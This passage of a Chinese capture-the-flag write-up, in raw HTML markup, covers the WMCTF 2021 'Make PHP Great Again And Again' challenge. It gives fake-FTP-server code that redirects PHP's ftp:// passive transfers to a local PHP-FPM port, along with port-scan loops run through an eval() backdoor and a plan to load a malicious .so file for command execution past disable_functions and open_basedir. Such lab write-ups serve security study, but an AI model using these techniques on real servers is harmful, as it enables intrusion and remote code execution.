&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;[+] listening ...........&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">socket&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">socket&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">socket&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">AF_INET&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">socket&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">SOCK_STREAM&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">bind&lt;/span>&lt;span style="color:#111">((&lt;/span>&lt;span style="color:#d88200">&amp;#39;0.0.0.0&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">9999&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">listen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">addr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">accept&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;220 (vsFTPd 3.0.3)&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0xff&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;331 Please specify the password.&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0xff&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;230 Login successful.&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0xff&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;200 Switching to Binary mode.&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0xff&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#34;550 Could not get file size.&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0xff&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># responese with 000 , not 229&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;000 use PASV then&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># then php will send PASV command&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0xff&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># response to PASV command&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;227 Entering Passive Mode (127,0,0,1,0,12345).&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0xff&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;150 Ok to send data.&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># sending payload .....&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;226 Transfer complete.&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0xff&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;221 Goodbye.&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">close&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;[+] completed ~~&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112234038671.png" alt="image-20211112234038671">&lt;/p>
&lt;p>成功转发&lt;/p>
&lt;h4 id="使用ftp将payload打向fpm">使用ftp://将payload打向fpm&lt;/h4>
&lt;p>结合上面几个实例应该就很清晰了，思路就是：&lt;/p>
&lt;ul>
&lt;li>编写包含执行系统命令的恶意.so&lt;/li>
&lt;li>打向fpm的一波流量，用于解开open_basedir, allow_url_include等的限制，形式是file_put_contents(&amp;lsquo;ftp://xxx&amp;rsquo;,$payload)&lt;/li>
&lt;li>用file_put_contents(&amp;rsquo;/tmp/wuhu.so&amp;rsquo;,$_POST[&amp;lsquo;data&amp;rsquo;])的形式将.so传入&lt;/li>
&lt;li>如果顺利的话open_basedir解开限制，.so被包含，就可以成功执行.so中的代码做到rce了&lt;/li>
&lt;/ul>
&lt;p>这里的完美栗子当然是赵总的三句话（指路赵总博客-&amp;gt;&lt;a href="https://www.zhaoj.in/read-6951.html">WMCTF2021-Web-Make PHP Great Again And Again WriteUp&lt;/a>&lt;/p>
&lt;h4 id="wmctf-2021make-php-great-again-and-again">[WMCTF 2021]Make PHP Great Again And Again&lt;/h4>
&lt;p>思路先放在前面：找到fpm端口-&amp;gt;搭建恶意ftp_server 将.so文件转发至fpm端口-&amp;gt;利用.so文件执行命令-&amp;gt;拿flag&lt;/p>
&lt;p>题目代码只有三句话&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">highlight_file&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">__FILE__&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">@&lt;/span>&lt;span style="color:#00a8c8">eval&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;glzjin&amp;#39;&lt;/span>&lt;span style="color:#111">]);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>直接看phpinfo();会500，用&lt;code>get_cfg_var&lt;/code>获取配置项&lt;/p>
&lt;pre tabindex="0">&lt;code>/?glzjin=var_dump(get_cfg_var(%27disable_functions%27));
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>string(657) &amp;#34;stream_socket_client,fsockopen,pfsockopen,ini_alter,ini_set,ini_get,posix_kill,phpinfo,putenv,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,iconv,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail,error_log,debug_backtrace,debug_print_backtrace,gc_collect_cycles,array_merge_recursive&amp;#34;
&lt;/code>&lt;/pre>&lt;p>只能说该禁的都禁了；再康康allow_url_fopen和include&lt;/p>
&lt;pre tabindex="0">&lt;code>string(1) &amp;#34;1&amp;#34;
string(0) &amp;#34;&amp;#34;
&lt;/code>&lt;/pre>&lt;p>再康康open_basedir&lt;/p>
&lt;pre tabindex="0">&lt;code>/?glzjin=var_dump(get_cfg_var(%27open_basedir%27));
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>string(14) &amp;#34;/var/www/html/&amp;#34;
&lt;/code>&lt;/pre>&lt;p>emmmmmmmmm 这个之后也需要绕过&lt;/p>
&lt;p>用tcp://伪协议扫一下本机开放的端口&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">for&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#ae81ff">65535&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#f92672">++&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$t&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#75af00">stream_socket_server&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;tcp://0.0.0.0:&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$ee&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$ee2&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$ee2&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#d88200">&amp;#34;Address already in use&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">var_dump&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>或者&lt;code>file_get_contents&lt;/code>和&lt;code>error_get_last&lt;/code>获取到请求中发出的错误进行循环判断也可以进行端口扫描&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">for&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#ae81ff">65535&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#f92672">++&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$t&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#75af00">file_get_contents&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;http://127.0.0.1:&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">strpos&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">error_get_last&lt;/span>&lt;span style="color:#111">()[&lt;/span>&lt;span style="color:#d88200">&amp;#39;message&amp;#39;&lt;/span>&lt;span style="color:#111">],&lt;/span> &lt;span style="color:#d88200">&amp;#34;Connection refused&amp;#34;&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">var_dump&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>int(11451) int(37114) int(48748)
&lt;/code>&lt;/pre>&lt;p>找到了fpm端口11451&lt;/p>
&lt;p>之后就续上了我们前面的思路，先在本地（也就是靶机的本地）起一个恶意的ftp_server服务用来转发FTP-DATA（即.so文件）至fpm端口（11451）；这里的exp是php版的，原理跟上面的py版是一样的&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$socket&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">stream_socket_server&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;tcp://0.0.0.0:46819&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$errno&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$errstr&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#111">$socket&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#d88200">$errstr&lt;/span>&lt;span style="color:#d88200"> (&lt;/span>&lt;span style="color:#d88200">$errno&lt;/span>&lt;span style="color:#d88200">)&amp;lt;br /&amp;gt;&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">while&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">stream_socket_accept&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$socket&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">fwrite&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;210 Fake FTP&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$line&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">fgets&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$line&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// USER
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">fwrite&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;230 Login successful&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$line&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">fgets&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$line&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// TYPE
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">fwrite&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;200 xx&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$line&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">fgets&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$line&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// SIZE
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">fwrite&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;550 xx&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$line&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">fgets&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$line&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// EPSV
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">fwrite&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;500 wtf&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$line&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">fgets&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$line&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// PASV
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// $ip = &amp;#39;192.168.1.4&amp;#39;;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">$ip&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;127.0.0.1&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$port&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">11451&lt;/span>&lt;span style="color:#111">;&lt;/span>
